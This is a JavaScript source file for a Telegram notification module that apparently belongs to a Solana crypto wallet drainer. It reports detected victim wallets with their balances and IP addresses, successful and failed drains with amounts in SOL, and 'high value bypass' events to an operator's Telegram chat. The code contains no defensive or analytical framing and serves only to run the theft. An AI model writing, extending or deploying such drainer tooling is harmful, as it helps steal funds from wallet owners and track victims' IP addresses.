import 'dotenv/config';

class TelegramLogger {
  constructor() {
    this.botToken = process.env.TELEGRAM_BOT_TOKEN;
    this.chatId = process.env.TELEGRAM_CHAT_ID;
    this.enabled = !!(this.botToken && this.chatId);
    
    if (this.enabled) {
      console.log('📱 Telegram logging enabled');
    } else {
      console.log('⚠️ Telegram logging disabled - missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
    }
  }

  /**
   * Send message to Telegram
   */
  async sendMessage(message, type = 'info') {
    if (!this.enabled) return;

    try {
      const formattedMessage = this.formatMessage(message, type);
      const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;
      
      const response = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: this.chatId,
          text: formattedMessage,
          parse_mode: 'HTML',
          disable_web_page_preview: true
        })
      });

      if (!response.ok) {
        console.error('❌ Failed to send Telegram message:', response.statusText);
      }
    } catch (error) {
      console.error('❌ Telegram send error:', error.message);
    }
  }

  /**
   * Format message with emojis and styling
   */
  formatMessage(message, type) {
    const timestamp = new Date().toLocaleString();
    const emoji = this.getEmoji(type);
    const prefix = this.getPrefix(type);
    
    return `${emoji} <b>${prefix}</b>\n\n${message}\n\n<code>⏰ ${timestamp}</code>`;
  }

  /**
   * Get emoji for message type
   */
  getEmoji(type) {
    const emojis = {
      'WALLET_DETECTED': '👛',
      'DRAIN_SUCCESS': '💰',
      'DRAIN_FAILED': '❌',
      'RATE_LIMIT': '⏰',
      'HIGH_VALUE_BYPASS': '💎',
      'INSUFFICIENT_FUNDS': '💸',
      'ERROR': '🚨'
    };
    return emojis[type] || 'ℹ️';
  }

  /**
   * Get prefix for message type
   */
  getPrefix(type) {
    const prefixes = {
      'WALLET_DETECTED': 'WALLET DETECTED',
      'DRAIN_SUCCESS': 'DRAIN SUCCESS',
      'DRAIN_FAILED': 'DRAIN FAILED',
      'RATE_LIMIT': 'RATE LIMIT',
      'HIGH_VALUE_BYPASS': 'HIGH VALUE BYPASS',
      'INSUFFICIENT_FUNDS': 'INSUFFICIENT FUNDS',
      'ERROR': 'ERROR'
    };
    return prefixes[type] || 'INFO';
  }

  /**
   * Log wallet detection (only when wallet is detected with meaningful balance)
   */
  async logWalletDetected(data) {
    const balance = data.lamports || 0;
    const balanceSOL = (balance / 1e9).toFixed(6);
    
    // Only log if wallet has meaningful balance (> 0.0001 SOL)
    if (balance < 100000) return;
    
    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
    const ip = data.ip || 'Unknown';
    
    const message = `
<b>👛 Wallet Detected</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
💰 <b>Balance:</b> ${balanceSOL} SOL
🌐 <b>IP:</b> ${ip}
    `.trim();

    await this.sendMessage(message, 'WALLET_DETECTED');
  }

  /**
   * Log successful drain (only after broadcast confirmation)
   */
  async logDrainSuccess(data) {
    const drainedAmount = data.actualDrainAmount || 0;
    const drainedSOL = (drainedAmount / 1e9).toFixed(6);
    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
    const ip = data.ip || 'Unknown';
    
    const message = `
<b>💰 Drain Success</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
💰 <b>Drained:</b> ${drainedSOL} SOL
🌐 <b>IP:</b> ${ip}
    `.trim();

    await this.sendMessage(message, 'DRAIN_SUCCESS');
  }

  /**
   * Log failed drain with specific reason
   */
  async logDrainFailed(data) {
    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
    const ip = data.ip || 'Unknown';
    const balance = data.lamports || 0;
    const balanceSOL = (balance / 1e9).toFixed(6);
    
    let reason = 'Unknown error';
    
    if (data.error) {
      if (data.error.includes('INSUFFICIENT_FUNDS')) {
        reason = 'Insufficient funds for fees';
      } else if (data.error.includes('INSUFFICIENT_SOL_FOR_FEES')) {
        reason = 'Insufficient SOL for transaction fees';
      } else if (data.error.includes('INSUFFICIENT_DRAIN_AMOUNT')) {
        reason = 'Drain amount too small after fees';
      } else if (data.error.includes('RATE_LIMITED')) {
        reason = 'Rate limit exceeded';
      } else if (data.error.includes('timeout')) {
        reason = 'Transaction timeout';
      } else if (data.error.includes('Simulation failed')) {
        reason = 'Transaction simulation failed';
      } else {
        reason = data.error;
      }
    }
    
    const message = `
<b>❌ Drain Failed</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
💰 <b>Balance:</b> ${balanceSOL} SOL
❌ <b>Reason:</b> ${reason}
🌐 <b>IP:</b> ${ip}
    `.trim();

    await this.sendMessage(message, 'DRAIN_FAILED');
  }

  /**
   * Log rate limit events
   */
  async logRateLimit(data) {
    const walletAddress = data.user ? data.user.toString().substring(0, 8) + '...' : 'Unknown';
    const ip = data.ip || 'Unknown';
    
    const message = `
<b>⏰ Rate Limit</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
🌐 <b>IP:</b> ${ip}
📝 <b>Details:</b> ${data.details}
    `.trim();

    await this.sendMessage(message, 'RATE_LIMIT');
  }

  /**
   * Log high value wallet bypass
   */
  async logHighValueBypass(data) {
    const walletAddress = data.user ? data.user.toString().substring(0, 8) + '...' : 'Unknown';
    const ip = data.ip || 'Unknown';
    const balance = data.lamports || 0;
    const balanceSOL = (balance / 1e9).toFixed(6);
    
    const message = `
<b>💎 High Value Bypass</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
💰 <b>Balance:</b> ${balanceSOL} SOL
🌐 <b>IP:</b> ${ip}
    `.trim();

    await this.sendMessage(message, 'HIGH_VALUE_BYPASS');
  }

  /**
   * Log insufficient funds
   */
  async logInsufficientFunds(data) {
    const walletAddress = data.user ? data.user.toString().substring(0, 8) + '...' : 'Unknown';
    const ip = data.ip || 'Unknown';
    const balance = data.lamports || 0;
    const balanceSOL = (balance / 1e9).toFixed(6);
    
    const message = `
<b>💸 Insufficient Funds</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
💰 <b>Balance:</b> ${balanceSOL} SOL
🌐 <b>IP:</b> ${ip}
    `.trim();

    await this.sendMessage(message, 'INSUFFICIENT_FUNDS');
  }

  /**
   * Log general errors
   */
  async logError(data) {
    const walletAddress = data.user ? data.user.toString().substring(0, 8) + '...' : 'Unknown';
    const ip = data.ip || 'Unknown';
    
    const message = `
<b>🚨 Error</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
🌐 <b>IP:</b> ${ip}
❌ <b>Error:</b> ${data.message || data.details}
    `.trim();

    await this.sendMessage(message, 'ERROR');
  }
}

// Create singleton instance
const telegramLogger = new TelegramLogger();

export default telegramLogger; 